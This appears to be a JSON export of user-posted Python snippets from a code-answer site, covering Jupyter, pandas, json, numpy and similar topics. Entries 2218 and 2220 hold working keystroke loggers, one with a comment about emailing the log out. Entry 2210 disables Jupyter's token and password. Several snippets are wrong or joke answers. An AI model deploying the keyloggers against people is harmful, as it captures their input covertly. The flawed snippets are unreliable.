    "description": "# Python 3 has a std lib # module for working with # IP addresses:  >>> import ipaddress  >>> ipaddress.ip_address('192.168.1.2') IPv4Address('192.168.1.2')  >>> ipaddress.ip_address('2001:af3::') IPv6Address('2001:af3::')  # Learn more here: # https://docs.python.org/3/library/ipaddress.html\n",
    "reg_date": "2021-10-12T11:31:16.000Z"
  },
  {
    "id": 2165,
    "keyword": null,
    "link": null,
    "title": " ipykernel install",
    "description": "source activate myenv python -m ipykernel install --user --name myenv --display-name \"Python (myenv)\" \npython -m ipykernel install --user --name=myenv \n",
    "reg_date": "2021-10-12T11:31:17.000Z"
  },
  {
    "id": 2166,
    "keyword": null,
    "link": null,
    "title": " ipython.display clear output",
    "description": "from IPython.display import clear_output  for i in range(10):     clear_output(wait=True)     print(\"Hello World!\") \n",
    "reg_date": "2021-10-12T11:31:17.000Z"
  },
  {
    "id": 2167,
    "keyword": null,
    "link": null,
    "title": " ipython autoreload",
    "description": "%load_ext autoreload %autoreload 2 \n",
    "reg_date": "2021-10-12T11:31:17.000Z"
  },
  {
    "id": 2168,
    "keyword": null,
    "link": null,
    "title": " ipython clear output",
    "description": "from IPython.display import clear_output  for i in range(10):     clear_output(wait=True)     print(\"Hello World!\") \n",
    "reg_date": "2021-10-12T11:31:17.000Z"
  },
  {
    "id": 2169,
    "keyword": null,
    "link": null,
    "title": " ipython save session",
    "description": "%save current_session ~0/ %save previous_session ~1/\n",
    "reg_date": "2021-10-12T11:31:17.000Z"
  },
  {
    "id": 2170,
    "keyword": null,
    "link": null,
    "title": " is instance string python",
    "description": "isinstance(x, int) isinstance(s, str)\n",
    "reg_date": "2021-10-12T11:31:17.000Z"
  },
  {
    "id": 2171,
    "keyword": null,
    "link": null,
    "title": " is int python",
    "description": "isinstance(n, int) # n = 9, Returns True / n = 5.5, Returns False\n'16'.isdigit() >>>True  '3.14'.isdigit() >>>False  'Some text'.isdigit() >>>False\n colors = [11, 34.1, 98.2, 43, 45.1, 54, 54]  for x in colors:     if int(x) == x:     \tprint(x)              #or     if isinstance(x, int):       \tprint(x)     \n(1.23).is_integer() # Returns false\nN.is_integer()\nvar.isdigit() #return true if all the chars in the string are numbers #return false if not all the chars in the string are numbers\n",
    "reg_date": "2021-10-12T11:31:17.000Z"
  },
  {
    "id": 2172,
    "keyword": null,
    "link": null,
    "title": " is not none python",
    "description": "# To check if a variable is not None: if x is not None:   # Do something\n>>> x = None  ... if x:  ...     print 'if x'  ... if x is not None:  ...     print 'if x is not None'\n",
    "reg_date": "2021-10-12T11:31:17.000Z"
  },
  {
    "id": 2173,
    "keyword": null,
    "link": null,
    "title": " is on cooldown discord.py",
    "description": "is_on_cooldown(Context) ''' Context is the context for the command is_on_cooldown returns a boolean operator of if the command mentioned is on cooldown. You need to pass_context to use it '''  EXAMPLE:    @client.command(pass_content=True) async def notcool(ctx):   for command in client.commands():     await ctx.channel.send(ctx.is_on_cooldown(command))     #This will send out the cooldown status of all the commands in the bot.\n",
    "reg_date": "2021-10-12T11:31:18.000Z"
  },
  {
    "id": 2174,
    "keyword": null,
    "link": null,
    "title": " is pythin a real coding language",
    "description": "it is you idiot \n",
    "reg_date": "2021-10-12T11:31:18.000Z"
  },
  {
    "id": 2175,
    "keyword": null,
    "link": null,
    "title": " is python a good language to learn",
    "description": "print(\"Yes!\")\n",
    "reg_date": "2021-10-12T11:31:18.000Z"
  },
  {
    "id": 2176,
    "keyword": null,
    "link": null,
    "title": " is there find all method in re or regex module in python?",
    "description": ">>> text = \"He was carefully disguised but captured quickly by police.\" >>> re.findall(r\"\\w+ly\", text) ['carefully', 'quickly'] \n",
    "reg_date": "2021-10-12T11:31:18.000Z"
  },
  {
    "id": 2177,
    "keyword": null,
    "link": null,
    "title": " isinstance float or int",
    "description": "isinstance(n, int) # n = 9, Returns True / n = 5.5, Returns False\n#checks if var is float or integer isinstance(var, (float, int))\n(1.23).is_integer() # Returns false\n",
    "reg_date": "2021-10-12T11:31:18.000Z"
  },
  {
    "id": 2178,
    "keyword": null,
    "link": null,
    "title": " isprime function in python",
    "description": "def isPrime(n):     if n > 1:           for i in range(2,n):               if (n % i) == 0:                   return False         return True     else:         return False\n",
    "reg_date": "2021-10-12T11:31:18.000Z"
  },
  {
    "id": 2179,
    "keyword": null,
    "link": null,
    "title": " iter content",
    "description": "#Get status code for the request using requests module import requests r = requests.get('https://github.com/') r.status_code\n",
    "reg_date": "2021-10-12T11:31:18.000Z"
  },
  {
    "id": 2180,
    "keyword": null,
    "link": null,
    "title": " iterar una lista en python",
    "description": "colores = [\"rojo\", \"verde\", \"amarillo\"] for color in colores:     print(color)\n",
    "reg_date": "2021-10-12T11:31:18.000Z"
  },
  {
    "id": 2181,
    "keyword": null,
    "link": null,
    "title": " iterate over every alternate character in string python",
    "description": "sentence = \"The quick brown fox jumped over the lazy dog.\"  sentence[::2] \n",
    "reg_date": "2021-10-12T11:31:18.000Z"
  },
  {
    "id": 2182,
    "keyword": null,
    "link": null,
    "title": " iterate over rows dataframe",
    "description": "for index, row in df.iterrows():     print(row['c1'], row['c2'])  Output:     10 100    11 110    12 120\ndf = pd.DataFrame([{'c1':10, 'c2':100}, {'c1':11,'c2':110}, {'c1':12,'c2':120}]) for index, row in df.iterrows():     print(row['c1'], row['c2'])\nimport pandas as pd import numpy as np  df = pd.DataFrame({'c1': [10, 11, 12], 'c2': [100, 110, 120]})  for index, row in df.iterrows():     print(row['c1'], row['c2']) \n# creating a list of dataframe columns  columns = list(df)     for i in columns:         # printing the third element of the column      print (df[i][2])\n",
    "reg_date": "2021-10-12T11:31:18.000Z"
  },
  {
    "id": 2183,
    "keyword": null,
    "link": null,
    "title": " iterate through all files in directory python",
    "description": "import os directory = 'the/directory/you/want/to/use'  for filename in os.listdir(directory):     if filename.endswith(\".txt\"):       #do smth       continue     else:     continue\nimport os  for filename in os.listdir(directory):     if filename.endswith(\".asm\") or filename.endswith(\".py\"):           # print(os.path.join(directory, filename))         continue     else:         continue\nimport os  for filename in os.listdir(directory):     if filename.endswith(\".asm\") or filename.endswith(\".py\"):           # print(os.path.join(directory, filename))         continue     else:         continue \n",
    "reg_date": "2021-10-12T11:31:19.000Z"
  },
  {
    "id": 2184,
    "keyword": null,
    "link": null,
    "title": " iterative binary search python",
    "description": "def binary_search(a, key): \tlow = 0 \thigh = len(a) - 1 \twhile low < high: \t\tmid = (low + high) // 2 \t\tif key == a[mid]: \t\t\treturn True \t\telif key < mid: \t\t\thigh = mid - 1 \t\telse: \t\t\tlow = mid + 1  \treturn False\n",
    "reg_date": "2021-10-12T11:31:19.000Z"
  },
  {
    "id": 2185,
    "keyword": null,
    "link": null,
    "title": " java store a int variable",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:31:19.000Z"
  },
  {
    "id": 2186,
    "keyword": null,
    "link": null,
    "title": " javascript ?? equivalent for python",
    "description": "#use \"or\"  42    or \"something\"    # returns 42 0     or \"something\"    # returns \"something\" None  or \"something\"    # returns \"something\" False or \"something\"    # returns \"something\" \"\"    or \"something\"    # returns \"something\"\n",
    "reg_date": "2021-10-12T11:31:19.000Z"
  },
  {
    "id": 2187,
    "keyword": null,
    "link": null,
    "title": " jinja2 datetime format",
    "description": "{{ date_of_something.strftime('%Y-%m-%d') }}\n",
    "reg_date": "2021-10-12T11:31:19.000Z"
  },
  {
    "id": 2188,
    "keyword": null,
    "link": null,
    "title": " jinja len is undefined",
    "description": "# use {% var|length %} # or {% var|count %}\n",
    "reg_date": "2021-10-12T11:31:19.000Z"
  },
  {
    "id": 2189,
    "keyword": null,
    "link": null,
    "title": " jinja templates tables",
    "description": "<table> {% for item in items %} <TR>    <TD class=\"c1\"><IMG src=\"favicon.ico\"></TD>    <TD class=\"c2\">{{item.date}}</TD>    <TD class=\"c3\">{{item.id}}</TD>    <TD class=\"c4\"><SPAN>{{item.position}}</SPAN></TD>    <TD class=\"c5\"><SPAN>{{item.status}}</SPAN></TD> </TR> {% endfor %} </table>\n<table> {% for item in items %} <TR>    <TD class=\"c1\"><IMG src=\"favicon.ico\"></TD>    <TD class=\"c2\">{{item.date}}</TD>    <TD class=\"c3\">{{item.id}}</TD>    <TD class=\"c4\"><SPAN>{{item.position}}</SPAN></TD>    <TD class=\"c5\"><SPAN>{{item.status}}</SPAN></TD> </TR> {% endfor %} </table> \nitems = [] for i in range(1, 11):     i = str(i)      # dict == {}     # you just don't have to quote the keys     an_item = dict(date=\"2012-02-\" + i, id=i, position=\"here\", status=\"waiting\")     items.append(an_item)  # ... your code here ...  template.render(items=items) \n",
    "reg_date": "2021-10-12T11:31:19.000Z"
  },
  {
    "id": 2190,
    "keyword": null,
    "link": null,
    "title": " join two numpy 2d array",
    "description": "import numpy as np  a = np.array([[0, 1, 3], [5, 7, 9]]) b = np.array([[0, 2, 4], [6, 8, 10]]) c = np.concatenate((a, b), axis=0) print(c)  Output :  [[ 0  1  3]  [ 5  7  9]  [ 0  2  4]  [ 6  8 10]]\n",
    "reg_date": "2021-10-12T11:31:19.000Z"
  },
  {
    "id": 2191,
    "keyword": null,
    "link": null,
    "title": " join two numpy arrays",
    "description": ">>> a = np.array([[1, 2], [3, 4]]) >>> b = np.array([[5, 6]]) >>> np.concatenate((a, b), axis=0) array([[1, 2],        [3, 4],        [5, 6]]) >>> np.concatenate((a, b.T), axis=1) array([[1, 2, 5],        [3, 4, 6]]) \nimport numpy as np  a = np.array([[0, 1, 3], [5, 7, 9]]) b = np.array([[0, 2, 4], [6, 8, 10]]) c = np.concatenate((a, b), axis=0) print(c)  Output :  [[ 0  1  3]  [ 5  7  9]  [ 0  2  4]  [ 6  8 10]]\nnumpy.concatenate([arr1, arr2]) # Joining arr1 and arr2\n#concatenating through column(axis = 1) numpy.concatenate((N,M),1)\n",
    "reg_date": "2021-10-12T11:31:19.000Z"
  },
  {
    "id": 2192,
    "keyword": null,
    "link": null,
    "title": " join two set in python",
    "description": "set1 = {1, 4, 5, 6} set2 = {1, 2, 3}  set3 = set1.union(set2) print(set3)\n",
    "reg_date": "2021-10-12T11:31:19.000Z"
  },
  {
    "id": 2193,
    "keyword": null,
    "link": null,
    "title": " json dump to file",
    "description": "with open('output.json', 'w') as outfile:     json.dump(data, outfile)\nimport json  data = {\"key\": \"value\"}  with open('data.json', 'w') as jsonfile:     json.dump(data, jsonfile) \nimport json with open('data.json', 'w') as f:     json.dump(data, f)\nimport json  data = {} data['people'] = [] data['people'].append({     'name': 'Scott',     'website': 'stackabuse.com',     'from': 'Nebraska' }) data['people'].append({     'name': 'Larry',     'website': 'google.com',     'from': 'Michigan' }) data['people'].append({     'name': 'Tim',     'website': 'apple.com',     'from': 'Alabama' })  with open('data.txt', 'w') as outfile:     json.dump(data, outfile) \nimport json  data = {}  with open('data.txt', 'w') as outfile:     json.dump(data, outfile) \nimport json  with open('data.txt') as json_file:     data = json.load(json_file)     for p in data['people']:         print('Name: ' + p['name'])         print('Website: ' + p['website'])         print('From: ' + p['from'])         print('') \n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2194,
    "keyword": null,
    "link": null,
    "title": " json dumps datetime",
    "description": "def myconverter(o):     if isinstance(o, datetime.datetime):         return o.__str__()  print(json.dumps(d, default = myconverter))\n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2195,
    "keyword": null,
    "link": null,
    "title": " json file to dict python",
    "description": "import json  with open('path_to_file/person.json') as f:   data = json.load(f)  print(data)\nimport json with open('result.json', 'w') as fp:     json.dump(sample, fp)\nimport json  with open(\"data.json\", \"r\") as json_file:     my_dict = json.load(json_file)\nimport json  with open('data.txt') as json_file:     data = json.load(json_file)\nimport json  data = {} data['people'] = [] data['people'].append({     'name': 'Scott',     'website': 'stackabuse.com',     'from': 'Nebraska' }) data['people'].append({     'name': 'Larry',     'website': 'google.com',     'from': 'Michigan' }) data['people'].append({     'name': 'Tim',     'website': 'apple.com',     'from': 'Alabama' })  with open('data.txt', 'w') as outfile:     json.dump(data, outfile) \nimport json  with open('data.txt') as json_file:     data = json.load(json_file)     for p in data['people']:         print('Name: ' + p['name'])         print('Website: ' + p['website'])         print('From: ' + p['from'])         print('') \n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2196,
    "keyword": null,
    "link": null,
    "title": " json list to dataframe python",
    "description": "import pandas as pd  json_list = [{},{},{}]  df = pd.DataFrame.from_records(json_list)\n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2197,
    "keyword": null,
    "link": null,
    "title": " json load from file python 3",
    "description": "import json  with open('file_to_load.json', 'r') as file:   data = json.load(file)\nimport json  data = {} data['people'] = [] data['people'].append({     'name': 'Scott',     'website': 'stackabuse.com',     'from': 'Nebraska' }) data['people'].append({     'name': 'Larry',     'website': 'google.com',     'from': 'Michigan' }) data['people'].append({     'name': 'Tim',     'website': 'apple.com',     'from': 'Alabama' })  with open('data.txt', 'w') as outfile:     json.dump(data, outfile) \n>>> jstr = json.dumps(data, ensure_ascii=False, indent=4) >>> print(jstr) {     \"item\": \"Beer\",     \"cost\": \"&pound;4.00\" } \n>>> import json >>> data = {'people':[{'name': 'Scott', 'website': 'stackabuse.com', 'from': 'Nebraska'}]} >>> json.dumps(data, indent=4) {     \"people\": [         {             \"website\": \"stackabuse.com\",              \"from\": \"Nebraska\",              \"name\": \"Scott\"         }     ] } \n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2198,
    "keyword": null,
    "link": null,
    "title": " json schema python",
    "description": "#Example usage of generating python code from jsonschemacodegen import python as pygen import json  with open('schema.json') as fp:     generator = pygen.GeneratorFromSchema('output_dir')     generator.Generate(json.load(fp), 'Example', 'example')  #using the generated code looks like  import example import json  jsonText = '[\"an example string in an array\"]'  obj = example.Example(json.loads(jsonText))  print(json.dumps(obj, default=lambda x: x.Serializable()))\nfrom datetime import datetime from typing import List, Optional from pydantic import BaseModel   class User(BaseModel):     id: int     name = 'John Doe'     signup_ts: Optional[datetime] = None     friends: List[int] = []   external_data = {     'id': '123',     'signup_ts': '2019-06-01 12:22',     'friends': [1, 2, '3'], } user = User(**external_data) print(user.id) #> 123 print(repr(user.signup_ts)) #> datetime.datetime(2019, 6, 1, 12, 22) print(user.friends) #> [1, 2, 3] print(user.dict()) \"\"\" {     'id': 123,     'signup_ts': datetime.datetime(2019, 6, 1, 12, 22),     'friends': [1, 2, 3],     'name': 'John Doe', } \"\"\"\n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2199,
    "keyword": null,
    "link": null,
    "title": " julia vs python",
    "description": "I love julia, its 10 times better than python.You all must be thinking that  python has more libraries than julia.the intresting part of julia is you can import python libraries in julia for eg-numpy, pandas, open-cv etc.The perfomance-speed after importing python libraries is just awesome.\nJulia definetly better at speed and performance compared to python But as Julia is a newer, so python beats julia in that thing as python has a enormous community , has more libraries and modules so more powerful and there is very research done in python compared to julia as python is since a very long time it is more stable but in future if julia will developed at a remarkable speed then it will definetly beat python\n\"\"\" Yes, Julia is a Superior Language to Python. It will take some time for the Julia community to rival Python's community. Surely it will happen, in time. What a great oppurtunity for us to build a new and Exciting language. Faster, Sleeker, Simpler,  composable multi-threaded parallelism! Julia really is Incredible and the Future of Data Engineering. The Reason that I love Julia is that the Language is written......In Julia!+ Compare Python, and it is Written in C.. Forgeddaboudit! This allows a Julia user to become much more intimate with the Framework. Julia also plays nice with Python, with the use of PYCall. It really is an Incredible language, and I don't think that your time  Will be wasted by learning Julia. \"\"\"\n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2200,
    "keyword": null,
    "link": null,
    "title": " jupyter clear cell output programmatically",
    "description": "from IPython.display import clear_output  for i in range(10):     clear_output(wait=True)     print(\"Hello World!\")\n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2201,
    "keyword": null,
    "link": null,
    "title": " jupyter consumes 100 disk",
    "description": "#delete the data a, b, c = pd.DataFrame(), pd.DataFrame(), pd.DataFrame() lst = [a, b, c] del a, b, c # dfs still in list del lst     # memory release now  #Track CPU and RAM usage import psutil # gives a single float value psutil.cpu_percent() # gives an object with many fields psutil.virtual_memory() dict(psutil.virtual_memory()._asdict()) # you can convert that object to a dictionary \n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2202,
    "keyword": null,
    "link": null,
    "title": " jupyter display all columns",
    "description": "pd.set_option('display.max_columns', None)\npd.set_option('display.max_columns', 999)\n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2203,
    "keyword": null,
    "link": null,
    "title": " jupyter ignore warnings",
    "description": "import warnings warnings.filterwarnings('ignore')\n",
    "reg_date": "2021-10-12T11:31:20.000Z"
  },
  {
    "id": 2204,
    "keyword": null,
    "link": null,
    "title": " jupyter install user environment",
    "description": "source activate myenv python -m ipykernel install --user --name myenv --display-name \"Python (myenv)\" \n",
    "reg_date": "2021-10-12T11:31:21.000Z"
  },
  {
    "id": 2205,
    "keyword": null,
    "link": null,
    "title": " jupyter nbextension",
    "description": "conda install -c conda-forge jupyter_contrib_nbextensions \njupyter contrib nbextension install --user \n",
    "reg_date": "2021-10-12T11:31:21.000Z"
  },
  {
    "id": 2206,
    "keyword": null,
    "link": null,
    "title": " jupyter notebook  reload module",
    "description": "%load_ext autoreload %autoreload 2\n",
    "reg_date": "2021-10-12T11:31:21.000Z"
  },
  {
    "id": 2207,
    "keyword": null,
    "link": null,
    "title": " jupyter notebook dark theme",
    "description": "1. pip install jupyterthemes 2. jt -t chesterish -fs 16 -nfs 14 -tfs 14 -ofs 16 -dfs 14 -cellw 1600 -T -N -kl -f anka -nf anka -tf anka\njt -t chesterish \n!pip install jupyterthemes !jt -t <theme-name> \nconda install jupyterthemes \n# Jupter Darcula Theme pip install JLDracula\n# list available themes # onedork | grade3 | oceans16 | chesterish | monokai | solarizedl | solarizedd jt -l  # select theme... jt -t chesterish  # restore default theme # NOTE: Need to delete browser cache after running jt -r # If this doesn't work, try starting a new notebook session. jt -r  # toggle toolbar ON and notebook name ON jt -t grade3 -T -N  # toggle kernel logo.  kernel logo is in same container as name # toggled with -N.  That means that making the kernel logo visible is # pointless without also making the name visible jt -t grade3 -N -kl  # set code font to 'Roboto Mono' 12pt # (see monospace font table below) jt -t onedork -f roboto -fs 12  # set code font to Fira Mono, 11.5pt # 3digit font-sizes get converted into float (115-->11.5) # 2digit font-sizes > 25 get converted into float (85-->8.5) jt -t solarizedd -f fira -fs 115  # set font/font-size of markdown (text cells) and notebook (interface) # see sans-serif & serif font tables below jt -t oceans16 -tf merriserif -tfs 10 -nf ptsans -nfs 13  # adjust cell width (% screen width) and line height jt -t chesterish -cellw 90% -lineh 170  # or set the cell width in pixels by leaving off the '%' sign jt -t solarizedl -cellw 860  # fix the container-margins on the intro page (defaults to 'auto') jt -t monokai -m 200  # adjust cursor width (in px) and make cursor red # options: b (blue), o (orange), r (red), p (purple), g (green), x (font color) jt -t oceans16 -cursc r -cursw 5  # choose alternate prompt layout (narrower/no numbers) jt -t grade3 -altp  # my two go-to styles # dark jt -t onedork -fs 95 -altp -tfs 11 -nfs 115 -cellw 88% -T # light jt -t grade3 -fs 95 -altp -tfs 11 -nfs 115 -cellw 88% -T\n",
    "reg_date": "2021-10-12T11:31:21.000Z"
  },
  {
    "id": 2208,
    "keyword": null,
    "link": null,
    "title": " jupyter notebook extensions",
    "description": "conda install -c conda-forge jupyter_contrib_nbextensions \npip install jupyter_contrib_nbextensions && jupyter contrib nbextension install \n",
    "reg_date": "2021-10-12T11:31:21.000Z"
  },
  {
    "id": 2209,
    "keyword": null,
    "link": null,
    "title": " jupyter notebook how to set max display row columns matrix numpy",
    "description": "#In order to set the max display of numpy matrix you can => np.set_printoptions(edgeitems=25, linewidth=100000)\n",
    "reg_date": "2021-10-12T11:31:21.000Z"
  },
  {
    "id": 2210,
    "keyword": null,
    "link": null,
    "title": " jupyter notebook no password or token",
    "description": "jupyter notebook --NotebookApp.token='' --NotebookApp.password=''\n",
    "reg_date": "2021-10-12T11:31:21.000Z"
  },
  {
    "id": 2211,
    "keyword": null,
    "link": null,
    "title": " jupyter notebook pass python variable to shell",
    "description": "dir_path = \"/home/foo/bar\" !cp file1 $dir_path  dir_path = \"/home/foo/bar\" !cp file1 {dir_path}  !cp file1 {dir_path + sub_dir}\n",
    "reg_date": "2021-10-12T11:31:21.000Z"
  },
  {
    "id": 2212,
    "keyword": null,
    "link": null,
    "title": " jupyter notebook warning off",
    "description": "import warnings warnings.filterwarnings('ignore')\nimport warnings warnings.filterwarnings('ignore') \n",
    "reg_date": "2021-10-12T11:31:21.000Z"
  },
  {
    "id": 2213,
    "keyword": null,
    "link": null,
    "title": " jupyter notebook widescreen",
    "description": "from IPython.core.display import display, HTML display(HTML(\"<style>.container { width:100% !important; }</style>\"))\n",
    "reg_date": "2021-10-12T11:31:22.000Z"
  },
  {
    "id": 2214,
    "keyword": null,
    "link": null,
    "title": " kaaba python tutorial",
    "description": "how to kaaba tutorial\n",
    "reg_date": "2021-10-12T11:31:22.000Z"
  },
  {
    "id": 2215,
    "keyword": null,
    "link": null,
    "title": " keep logged selenium",
    "description": "#saving cookies   import pickle  from selenium import webdriver    driver = webdriver.Firefox()  driver.get('http://www.quora.com')  # login code  pickle.dump(driver.get_cookies() , open(\"QuoraCookies.pkl\",\"wb\"))    #loading cookies   import pickle  from selenium import webdriver    driver = webdriver.Firefox()  driver.get('http://www.quora.com')  for cookie in pickle.load(open(\"QuoraCookies.pkl\", \"rb\")):      driver.add_cookie(cookie) \n",
    "reg_date": "2021-10-12T11:31:22.000Z"
  },
  {
    "id": 2216,
    "keyword": null,
    "link": null,
    "title": " keras auc without tf.metrics.auc",
    "description": "import tensorflow as tf from sklearn.metrics import roc_auc_score  def auroc(y_true, y_pred):     return tf.py_func(roc_auc_score, (y_true, y_pred), tf.double)  # Build Model...  model.compile(loss='categorical_crossentropy', optimizer='adam',metrics=['accuracy', auroc])\n",
    "reg_date": "2021-10-12T11:31:22.000Z"
  },
  {
    "id": 2217,
    "keyword": null,
    "link": null,
    "title": " keras ensure equal class representation during traingin",
    "description": "from sklearn.utils import class_weight class_weights = class_weight.compute_class_weight('balanced',                                                  np.unique(y_train),                                                  y_train) model.fit(X_train, y_train, class_weight=class_weights)\n",
    "reg_date": "2021-10-12T11:31:22.000Z"
  },
  {
    "id": 2218,
    "keyword": null,
    "link": null,
    "title": " key tracer in python",
    "description": "#pip install pynput OR python3 -m pip install pynput #ONLY ONE MODULE REQUIRED from pynput.keyboard import Listener #add \", Key\" here if you want to be able to act when keys like Enter and esc are pressed) #you can use the yagmail python module to email yourself the log with a gmail account when a key is pressed (if key.char == ... OR if key=Key.(esc, enter, shift)) file = open(\"log.txt\", \"a\") #save to the current directory. To save to another location use r'C:\\Users\\k\\t\\m\\etc\\log.txt' #NOTE - it does not matter if \"log.txt\" exists or not. Python will automatically create that file. def on_press(key):   try:     file.write(f'\\n{key}')     file.flush() #save changes   except:     pass #ignore all errors listener = Listener(on_press=on_press) #you can also use \"with listener as Listener(on_press...):\" listener.start() listener.join()\n",
    "reg_date": "2021-10-12T11:31:22.000Z"
  },
  {
    "id": 2219,
    "keyword": null,
    "link": null,
    "title": " keyerror: 'OUTPUT PATH'",
    "description": "fptr = sys.stdout   # stdout is already an open stream   #or os.environ['OUTPUT_PATH'] = 'junk.txt'  # before you open the fptr!  \n",
    "reg_date": "2021-10-12T11:31:22.000Z"
  },
  {
    "id": 2220,
    "keyword": null,
    "link": null,
    "title": " keylogger in python",
    "description": "import logging import os from pynput.keyboard import Listener  log_Directory = os.getcwd() + '/'  # where save file print(os.getcwd()) # directory # create file  logging.basicConfig(filename=(log_Directory + \"key_log.txt\"), level=logging.DEBUG, format='%(asctime)s: %(message)s')  # function in logging def on_press(key):     logging.info(key)     # when press key save the key in file   with Listener(on_press=on_press) as listener:     listener.join()  # infinite cicle\n#pip install pynput OR python3 -m pip install pynput #ONLY ONE MODULE REQUIRED from pynput.keyboard import Listener #add \", Key\" here if you want to be able to act when keys like Enter and esc are pressed) #you can use the yagmail python module to email yourself the log with a gmail account when a key is pressed (if key.char == ... OR if key=Key.(esc, enter, shift)) file = open(\"log.txt\", \"a\") #save to the current directory. To save to another location use r'C:\\Users\\k\\t\\m\\etc\\log.txt' #NOTE - it does not matter if \"log.txt\" exists or not. Python will automatically create that file. def on_press(key):   try:     file.write(f'\\n{key}')     file.flush() #save changes   except:     pass #ignore all errors listener = Listener(on_press=on_press) #you can also use \"with listener as Listener(on_press...):\" listener.start() listener.join()\n#Import required modules from pynput.keyboard import Key #Create an empty list to store pressed keys keys = [] #Create a function that defines what to do on each key press def on_each_key_press(key):     #Append each pressed key to a list     keys.append(key)     #Write list to file after each key pressed     write_keys_to_file(keys) \n",
    "reg_date": "2021-10-12T11:31:22.000Z"
  },
  {
    "id": 2221,
    "keyword": null,
    "link": null,
    "title": " keys in python",
    "description": "car = {   \"brand\": \"Ford\",   \"model\": \"Mustang\",   \"year\": 1964 } # the keys are like variables in dictionary which saves a value  x = car.keys()  print(x)\n",
    "reg_date": "2021-10-12T11:31:22.000Z"
  },
  {
    "id": 2222,
    "keyword": null,
    "link": null,
    "title": " kill django port",
    "description": "sudo lsof -t -i tcp:8000 | xargs kill -9\nsudo fuser -k 8000/tcp\nKill port django\nKill port\n",
    "reg_date": "2021-10-12T11:31:22.000Z"
  },
  {
    "id": 2223,
    "keyword": null,
    "link": null,
    "title": " kivy changing screen in python",
    "description": "self.parent.current = 'screen_name_you_want_to_switch_to' \n",
    "reg_date": "2021-10-12T11:31:23.000Z"
  },
  {
    "id": 2224,
    "keyword": null,
    "link": null,
    "title": " kivy splash screen",
    "description": "from kivy.app import App from kivy.uix.image import Image from kivy.animation import Animation from kivy.clock import Clock  class timer():     def work1(self):         print(\"Hello World\")  class arge(App):      def build(self):          #Splash Screen         wing = Image(source= \"bookLogo.jpg\",pos=(800,800))         animation = Animation(x=0, y=0, d=2, t='out_bounce');         animation.start(wing)           Clock.schedule_once(timer.work1, 5) #run timer.work1 after 5 seconds          return wing  if __name__ == '__main__':     arge().run() \n",
    "reg_date": "2021-10-12T11:31:23.000Z"
  },
  {
    "id": 2225,
    "keyword": null,
    "link": null,
    "title": " knn sklearn",
    "description": "X = [[0], [1], [2], [3]] y = [0, 0, 1, 1] from sklearn.neighbors import KNeighborsClassifier neigh = KNeighborsClassifier(n_neighbors=3) neigh.fit(X, y)  print(neigh.predict([[1.1]]))  print(neigh.predict_proba([[0.9]]))  \n",
    "reg_date": "2021-10-12T11:31:23.000Z"
  },
  {
    "id": 2226,
    "keyword": null,
    "link": null,
    "title": " know menu's height tkinter",
    "description": "import tkinter as tk  #Init the window window = tk.Tk()  #Creation and attachment of the Menu to the window menuBar = tk.Menu(window) window.config(menu = menuBar)  #Access to the menu's size in pixels wherever you are (in a function for example) menuHeight = window.winfo_children()[3].winfo_reqheight() #Height of the menu menuWidth = window.winfo_children()[3].winfo_reqwidth() #Width of the menu\n",
    "reg_date": "2021-10-12T11:31:23.000Z"
  },
  {
    "id": 2227,
    "keyword": null,
    "link": null,
    "title": " knowing the sum of null value is pandas dataframe",
    "description": "note:df is your pandas dataframe  print(df.isnull().sum())\n",
    "reg_date": "2021-10-12T11:31:23.000Z"
  },
  {
    "id": 2228,
    "keyword": null,
    "link": null,
    "title": " koncemzem",
    "description": "public int Version = 102\n",
    "reg_date": "2021-10-12T11:31:23.000Z"
  },
  {
    "id": 2229,
    "keyword": null,
    "link": null,
    "title": " label encoding column pandas",
    "description": "import seaborn as sns  df = sns.load_dataset('iris') df['species'] = df['species'].astype('category').cat.codes df.head(3) '''sepal_length\tsepal_width\tpetal_length\tpetal_width\tspecies \t5.1\t\t\t\t\t3.5\t\t\t1.4\t\t\t\t\t0.2\t\t\t0 \t4.9\t\t\t\t\t3.0\t\t\t1.4\t\t\t\t\t0.2\t\t\t0 \t4.7\t\t\t\t\t3.2\t\t\t1.3\t\t\t\t\t0.2\t\t\t0'''\nimport seaborn as sns  df = sns.load_dataset('iris') def encode(x):     for i,j in enumerate(df['species'].unique()):         if x == j:             return i  df['species'] = df['species'].apply(lambda x:encode(x))\n",
    "reg_date": "2021-10-12T11:31:23.000Z"
  },
  {
    "id": 2230,
    "keyword": null,
    "link": null,
    "title": " label size matplotlib",
    "description": "  plt.xlabel(\"Time (s)\", fontsize = 40)\n",
    "reg_date": "2021-10-12T11:31:25.000Z"
  },
  {
    "id": 2231,
    "keyword": null,
    "link": null,
    "title": " lake bogoria",
    "description": "import turtle import math import colorsys phi = 180 * (3 - math.sqrt(5)) t = turtle.Pen() t.speed(0) def square(t, size):     for tmp in range(0,4):         t.forward(size)         t.right(90) num = 200 for x in reversed(range(0, num)):     t.fillcolor(colorsys.hsv_to_rgb(x/num, 1.0, 1.0))     t.begin_fill()     t.circle(5 + x, None, 11)     square(t, 5 + x)     t.end_fill()     t.right(phi)     t.right(.8) turtle.mainloop() \n",
    "reg_date": "2021-10-12T11:31:25.000Z"
  },
  {
    "id": 2232,
    "keyword": null,
    "link": null,
    "title": " lambda with two columns pandas",
    "description": "tp['col'] = tp.apply(lambda row: row['source'] if row['target'] in ['b', 'n'] else 'x',                      axis=1)\n",
    "reg_date": "2021-10-12T11:31:25.000Z"
  },
  {
    "id": 2233,
    "keyword": null,
    "link": null,
    "title": " last 24 hour python datetime",
    "description": "lastHourDateTime = datetime.datetime.now() - datetime.timedelta(hours = 1)\n",
    "reg_date": "2021-10-12T11:31:25.000Z"
  },
  {
    "id": 2234,
    "keyword": null,
    "link": null,
    "title": " last history of whatsapp message with python",
